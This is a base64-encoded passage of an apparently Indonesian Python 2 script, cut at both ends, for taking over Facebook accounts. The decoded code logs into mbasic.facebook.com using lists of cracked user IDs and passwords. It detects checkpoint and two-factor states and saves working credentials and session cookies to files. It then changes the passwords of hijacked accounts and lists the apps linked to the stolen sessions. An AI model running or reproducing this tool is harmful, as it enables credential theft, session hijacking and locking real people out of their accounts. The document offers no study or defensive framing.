ICIlKFAsc3RyKG9wdCsxKSxLLG5nZXdbb3B0XSkpDQogICAgICAgICAgICBpZiAiMCIgaW4gc3RyKGxlbihuZ2V3KSk6DQogICAgICAgICAgICAJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KICAgICAgICAgICAgCSAgICBjb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgICAgICAgICAgICAgICAgIGlmICJ1YmFoIiBpbiBzZWxmLnViYWhfcGFzczoNCiAgICAgICAgICAgICAgICAgICAgCXNlbGYudWJhaF9wdyh1aWQscHcsc2VzLHJ1bixsaW5rMikNCiAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gb25lIHRhYiwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICAiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIGVsaWYgIk1hc3Vra2FuIEtvZGUgTWFzdWsgdW50dWsgTWVsYW5qdXRrYW4iIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cihydW4pKToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPDlyBha3VuIHRlcnBhc2FuZyBhdXRlbnRpZmlrYXNpIDIgZmFrdG9yICAgIiUoTSkpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXMhIHRlcmtlbmEgc3BhbSwgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgICAgIHByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIGVsaWYgImNfdXNlciIgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVpZCxwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgCXByaW50KCJcciAgICAgICVz4oiaIGFrdW4gdGlkYWsgY2hlY2twb2ludCwgc2lsYWhrYW4gYW5kYSBsb2dpbiAgICIlKEgpKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1aWQscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICBlbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJ1bik6DQogICAgICAgIAlwcmludCAnXHIgJXMqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXMgICcgJSAoSyx1aWQscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdWlkLHB3LGRheSxtb250aCx5ZWFyKQ0KICAgICAgICAJcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICBkZWYgY3IzY2soc2VsZix1aWQscHcpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWNrcG9pbnQiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICBmb3JtID0gcnVuLmZpbmQoImZvcm0iKQ0KICAgICAgICAgICAgdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpDQogICAgICAgICAgICBsaW5rMj1ydW4uZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgICAgICBkdHNnID0gZm9ybS5maW5kKCJpbnB1dCIseyJuYW1lIjoiZmJfZHRzZyJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAganpzdCA9IGZvcm0uZmluZCgiaW5wdXQiLHsibmFtZSI6Imphem9lc3QifSlbInZhbHVlIl0NCiAgICAgICAgICAgIG5oICAgPSBmb3JtLmZpbmQoImlucHV0Iix7Im5hbWUiOiJuaCJ9KVsidmFsdWUiXQ0KICAgICAgICAgICAgZGF0YUQgPSB7ImZiX2R0c2ciOiBkdHNnLCJmYl9kdHNnIjogZHRzZywiamF6b2VzdCI6IGp6c3QsImphem9lc3QiOiBqenN0LCJjaGVja3BvaW50X2RhdGEiOiIiLCJzdWJtaXRbQ29udGludWVdIjoiTGFuanV0a2FuIiwibmgiOiBuaH0NCiAgICAgICAgICAgIHhueHggPSBwYXJzZXIoc2VzLnBvc3QobWIrZm9ybVsiYWN0aW9uIl0sIGRhdGE9ZGF0YUQpLnRleHQsICJodG1sLnBhcnNlciIpDQogICAgICAgICAgICBuZ2V3ID0gW3l5LnRleHQgZm9yIHl5IGluIHhueHguZmluZF9hbGwoIm9wdGlvbiIpXQ0KICAgICAgICAgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgICAgICBmb3Igb3B0IGluIHJhbmdlKGxlbihuZ2V3KSk6ICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcHJpbnQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIob3B0KzEpLEssbmdld1tvcHRdKSkNCiAgICAgICAgICAgIGlmICIwIiBpbiBzdHIobGVuKG5nZXcpKToNCiAgICAgICAgICAgIAlpZiAiTGloYXQgZGV0YWlsIGxvZ2luIHlhbmcgZGl0YW1waWxrYW4uIEluaSBBbmRhPyIgaW4gdGl0bGU6DQogICAgICAgICAgICAJICAgIGNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCiAgICAgICAgICAgICAgICAgICAgaWYgInViYWgiIGluIHNlbGYudWJhaF9wYXNzOg0KICAgICAgICAgICAgICAgICAgICAJc2VsZi51YmFoX3B3KHVpZCxwdyxzZXMscnVuLGxpbmsyKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAJcHJpbnQoIlxyICAgICAgJXPiiJogYWt1biBvbmUgdGFiLCBzaWxhaGthbiBhbmRhIGxvZ2luICAgICIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIFxuIiUgKHVpZCxwdykpDQogICAgICAgICAgICAgICAgZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJ1bikpOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlc8OXIGFrdW4gdGVycGFzYW5nIGF1dGVudGlmaWthc2kgMiBmYWt0b3IgICAiJShNKSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgdGVya2VuYSBzcGFtLCBtb2RlIHBlc2F3YXRrYW4gMiBkZXRpayAgICIlKE0pKQ0KICAgICAgICAgICAgcHJpbnQoIlxyJXMjJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSVzPiIlKFAsTSxQKSkNCiAgICAgICAgZWxpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIgICAgICAlc+KImiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gICAiJShIKSkNCiAgICAgICAgCXByaW50KCJcciVzIyVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0lcz4iJShQLE0sUCkpDQogICAgICAgIAlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXMgXG4iJSAodWlkLHB3KSkNCiAgICAgICAgZWxpZiAibG9naW5fZXJyb3IiIGluIHN0cihydW4pOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1aWQscHcpDQogICAgICAgIAlwcmludCgiXHIlcyMlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJXM+IiUoUCxNLFApKQ0KICAgIGRlZiB1YmFoX3B3KHNlbGYsdWlkLHB3LHNlcyxydW4sbGluazIpOg0KICAgIAlkYXQsZGF0Mj17fSx7fQ0KICAgIAlidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KICAgICAgICBmb3IgeCBpbiBydW4oImlucHV0Iik6DQogICAgICAgIAlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCiAgICAgICAgCSAgICBkYXQudXBkYXRlKHt4LmdldCgibmFtZSIpOnguZ2V0KCJ2YWx1ZSIpfSkNCiAgICAgICAgdWJhaFB3PXNlcy5wb3N0KHNlbGYudXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCiAgICAgICAgcmVzVWJhaD1wYXJzZXIodWJhaFB3LCJodG1sLnBhcnNlciIpDQogICAgICAgIGxpbmszPXJlc1ViYWguZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQogICAgICAgIGJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCiAgICAgICAgaWYgIkJ1YXQgS2F0YSBTYW5kaSBCYXJ1IiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodWJhaFB3KSk6DQogICAgICAgIAlmb3IgYiBpbiByZXNVYmFoKCJpbnB1dCIpOg0KICAgICAgICAJICAgIGlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCiAgICAgICAgCSAgICAgICAgZGF0Mi51cGRhdGUoe2IuZ2V0KCJuYW1lIik6Yi5nZXQoInZhbHVlIil9KQ0KICAgICAgICAJZGF0Mi51cGRhdGUoeyJwYXNzd29yZF9uZXciOiIiLmpvaW4oc2VsZi5wd2JhcnUpfSkNCiAgICAgICAgCWFuPXNlcy5wb3N0KHNlbGYudXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KICAgICAgICAJY29raSA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KICAgICAgICAJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNhbmRpIGJlcmhhc2lsIGRpIHViYWggXG4gKi0tPiAlcyDil4ogJXMg4peKICVzCQkJIiUoSCx0aWwsdWlkLHNlbGYucHdiYXJ1WzBdLGNva2kpKQ0KICAgICAgICAJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1aWQsc2VsZi5wd2JhcnVbMF0sY29raSkpDQogICAgICAgIAlzZWxmLmFwbGlrYXNpKGNva2kpDQogICAgZGVmIGFwbGlrYXNpKHNlbGYsa3VraSk6DQogICAgICAgIHNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICBydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQogICAgICAgIHJ1bl8gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWluYWN0aXZlIikNCiAgICAgICAgb3R3ID0gc2VzLmdldChydW4sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIG90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQogICAgICAgIGdlbSA9IHBhcnNlcihvdHcuY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBnZW1fID0gcGFyc2VyKG90d18uY29udGVudCwnaHRtbC5wYXJzZXInKQ0KICAgICAgICBhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgYXBrXyA9IGdlbV8uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCiAgICAgICAgbm8gPSAwDQogICAgICAgIG5vXyA9IDANCiAgICAgICAgdHJ5Og0KICAgICAgICAJZm9yIGFwcCBpbiBhcGsuZmluZF9hbGwoImgzIik6DQogICAgICAgIAkgICAgZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vKz0xDQogICAgICAgIAkgICAgc2VsZi5nbS5hcHBlbmQoIiAgICAgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQogICAgICAgIAlmb3IgYXBwXyBpbiBhcGtfLmZpbmRfYWxsKCJoMyIpOg0KICAgICAgICAJICAgIGRhdGFfID0gYXBwXy5maW5kKCdzcGFuJykudGV4dA0KICAgICAgICAJICAgIG5vXys9MQ0KICAgICAgICAJICAgIHNlbGYuZ20uYXBwZW5kKCIgICAgICAlcyVzLiAlcyVzICIlKFAsc3RyKG5vXyksTSxkYXRhXykpDQogICAgICAgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCiAgICAgICAgCXByaW50ICgiJXPigKIgZ2FnYWwgbWVuZGV0ZWtzaSIlKE0pKQ0KIyBDRUsgT1BTSSBVQkFIIFBXDQp1YmFoX3Bhc3MgPSBbXQ0KcHdiYXJ1ID0gW10NCnB3QmFydSA9IFtdDQp1cmwgPSAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tIg0KZGVmIHViYWhwdygpOg0KCWphbGFuKCIlc+KAoiVzIE1vZGUgcGVzYXdhdGthbiB0ZXJsZWJpaCBkYWh1bHUgNSBkZXRpayAiJShVLE8pKQ0KCXB3PXJhd19pbnB1dCgiXG4lcyVzJXMgdWJhaCBzYW5kaSBwYWRhIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiBwdyBpblsnJ106DQoJCXByaW50KCIlc+KAoiBpc2kgeWcgYmVuYXIga2VudG9kICIlKE0pKQ0KCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCXViYWhfcGFzcy5hcHBlbmQoInkiKQ0KCQlwdzI9cmF3X2lucHV0KCIlcyVzJXMgbWFzdWthbiBzYW5kaSAlcz4gJXMiJShVLHRpbCxPLE0sSykpDQoJCWlmIGxlbihwdzIpIDw9IDU6DQoJCQlleGl0KCIlc+KAoiBzYW5kaSBtaW5pbWFsIDYga2FyYWt0ZXIgIiUoTSkpDQoJCWVsc2U6DQoJCQlwd2JhcnUuYXBwZW5kKHB3MikNCgllbHNlOg0KCQlwYXNzDQpkZWYgZmlsZV9jcCgpOg0KICAgIGRpcnMgPSBvcy5saXN0ZGlyKCdDUCcpDQogICAgcHJpbnQgKCJcbiVz4oCiJXMgWyVzIHBpbGloIGhhc2lsIGNyYWNrIHlnIHRlcnNpbXBhbiB1bnR1ayBjZWsgb3BzaSAlc11cbiIlKFUsTyxVLE8pKQ0KICAgIGZvciBmaWxlIGluIGRpcnM6DQogICAgICAgIHByaW50KCIlc+KAoiVzPiAlcyVzIiUoVSxNLEssZmlsZSkpO2plZGEoMC4wNykNCiAgICB0cnk6DQogICAgCXByaW50KCJcbiVzJXMlcyBNYXN1a2FuIGZpbGUgWyBjdGglczogJXMlcy50eHQlcyBdIiUoVSx0aWwsTyxNLEssd2FrdHUsTykpDQogICAgICAgIG9wc2koKQ0KICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICBwcmludCAoJyVz4oCiIGZpbGUgdGlkYWsgYWRhJyUoTSkpO2V4aXQoKQ0KZGVmIG9wc2koKToNCglDUCA9ICgiQ1AvIikNCglyb21pID0gcmF3X2lucHV0KCIlcyVzJXMgTmFtYSBmaWxlICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCglpZiByb21pID09ICIiOg0KCQlwcmludCgiJXMlcyBpc2kgeWFuZyBiZW5hciAiJShNLHRpbCkpO2plZGEoMik7b3BzaSgpDQoJdHJ5Og0KCQlmaWxlX2NwID0gb3BlbihDUCtyb21pLCAiciIpLnJlYWRsaW5lcygpDQoJZXhjZXB0IElPRXJyb3I6DQoJCWV4aXQoIlxuJXMlcyBuYW1hIGZpbGUgJXMgdGlkYWsgdGVyc2VkaWEiJShNLHRpbCxyb21pKSkNCgl1YmFocHcoKQ0KCXByaW50KCJcbiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCXByaW50ICgiJXMlcyVzIHRvdGFsIGFrdW4gJXM6ICVzJXMgIiUoVSx0aWwsTyxNLEssc3RyKGxlbihmaWxlX2NwKSkpKQ0KCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMiJShQLE0sUCkpO2plZGEoMikNCglub21vciA9IDANCglmb3IgZmIgaW4gZmlsZV9jcDoNCgkJYWt1biA9IGZiLnJlcGxhY2UoIlxuIiwiIikNCgkJbmdlY2VrICA9IGFrdW4uc3BsaXQoIiDil4ogIikNCgkJbm9tb3IrPTENCgkJcHJpbnQoIlxuJXMlcy4lcyBsb2dpbiBha3VuICVzPiAlcyVzIiUoSCxzdHIobm9tb3IpLE8sTSxLLGFrdW4ucmVwbGFjZSgiICotLT4gIiwiIikpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCW1lbmdlY2VrKG5nZWNla1swXS5yZXBsYWNlKCIgKi0tPiAiLCIiKSwgbmdlY2VrWzFdKQ0KCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCQlwcmludCgiXHIlc+KAoiB0aWRhayBhZGEga29uZWtzaSAiJShNKSksc3lzLnN0ZG91dC5mbHVzaCgpO2plZGEoMSkNCgkJCXBhc3MNCgkJZXhjZXB0Og0KCQkJcGFzcw0KCXByaW50KCJcbiVzJXMlcyBTZWxlc2FpIG1lbmdlY2VrIGFrdW4iJShVLHRpbCxPKSk7amVkYSgwLjA3KQ0KCXJhd19pbnB1dCgnJXMlcyVzIFslcyBFbnRlciVzIF0gJyUoVSx0aWwsTyxVLE8pKQ0KCW1lbnUoKQ0KZGF0YSA9IHt9DQpkYXRhMiA9IHt9DQpkZWYgbWVuZ2VjZWsodXNlcixwdyk6DQoJZ2xvYmFsIGxvb3AsdWJhaF9wYXNzLHB3YmFydQ0KCXNlc3Npb249cmVxdWVzdHMuU2Vzc2lvbigpDQoJc2Vzc2lvbi5oZWFkZXJzLnVwZGF0ZSh7DQoJCSJIb3N0IjoibWJhc2ljLmZhY2Vib29rLmNvbSIsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsDQoJCSJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjkiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIsDQoJCSJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIg0KCX0pDQoJc291cD1wYXJzZXIoc2Vzc2lvbi5nZXQodXJsKyIvbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04IikudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWxpbms9c291cC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCglmb3IgeCBpbiBzb3VwKCJpbnB1dCIpOg0KCQlkYXRhLnVwZGF0ZSh7eC5nZXQoIm5hbWUiKTp4LmdldCgidmFsdWUiKX0pDQoJZGF0YS51cGRhdGUoeyJlbWFpbCI6dXNlciwicGFzcyI6cHd9KQ0KCXVybFBvc3Q9c2Vzc2lvbi5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2xpbmsuZ2V0KCJhY3Rpb24iKSxkYXRhPWRhdGEpDQoJcmVzcG9uc2U9cGFyc2VyKHVybFBvc3QudGV4dCwgImh0bWwucGFyc2VyIikNCglpZiAiVGVtdWthbiBBa3VuIEFuZGEiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1cmxQb3N0LnRleHQpKToNCgkJcHJpbnQoIlxyJXPigKIgbW9kZSBwZXNhd2F0a2FuIHNlbGFtYSA1IGRldGlrJXMiJShNKSkNCglpZiAiY191c2VyIiBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCgkJaWYgIkFrdW4gQW5kYSBEaWt1bmNpIiBpbiB1cmxQb3N0LnRleHQ6DQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRlcmt1bmNpIHNlc2kgbmV3IiUoTSkpDQoJCWVsc2U6DQoJCQlsb29wKz0xDQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gIiUoSCkpDQoJCQlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQoJZWxpZiAiY2hlY2twb2ludCIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCWxvb3ArPTENCgkJdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSkNCgkJbGluazI9cmVzcG9uc2UuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQoJCWxpc3RJbnB1dD1bJ2ZiX2R0c2cnLCdqYXpvZXN0JywnY2hlY2twb2ludF9kYXRhJywnc3VibWl0W0NvbnRpbnVlXScsJ25oJ10NCgkJZm9yIHggaW4gcmVzcG9uc2UoImlucHV0Iik6DQoJCQlpZiB4LmdldCgibmFtZSIpIGluIGxpc3RJbnB1dDoNCgkJCQlkYXRhMi51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCQlhbj1z